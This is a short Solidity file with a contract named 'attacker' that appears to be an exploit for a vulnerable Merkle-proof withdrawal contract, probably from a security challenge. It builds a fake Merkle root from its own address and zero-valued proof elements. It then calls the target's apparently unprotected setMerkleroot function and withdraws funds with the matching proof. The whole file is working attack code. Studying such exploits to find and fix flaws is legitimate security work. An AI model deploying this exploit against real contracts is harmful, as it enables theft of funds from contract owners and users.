pragma solidity 0.8.13;

contract attacker{

    IMerkle merk;
    bytes32 root;
    
    function init(address _addr)public{
        merk = IMerkle(_addr);
        calculateRoot();
    }

    function step01_setRoot()public payable{
        merk.setMerkleroot(root);
    }

    function step02_attack()public {
        bytes32[] memory proof = new bytes32[](2);
        proof[0] = 0x0000000000000000000000000000000000000000000000000000000000000000;
        proof[1] = 0x0000000000000000000000000000000000000000000000000000000000000000;
        merk.withdraw(proof, address(this));
    }

    function calculateRoot() public{
        bytes32[] memory proof = new bytes32[](2);
        proof[0] = 0x0000000000000000000000000000000000000000000000000000000000000000;
        proof[1] = 0x0000000000000000000000000000000000000000000000000000000000000000;

        bytes32 computedHash = keccak256(abi.encodePacked(address(this)));
        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];
            if (computedHash <= proofElement) {
                // Hash(current computed hash + current element of the proof)
                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
            } else {
                // Hash(current element of the proof + current computed hash)
                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
            }
        }
        root = computedHash;
    }

    fallback() external payable{}
}

interface IMerkle{
    function withdraw(bytes32[] memory,address) external returns(bool);
    function setMerkleroot(bytes32) external ;
}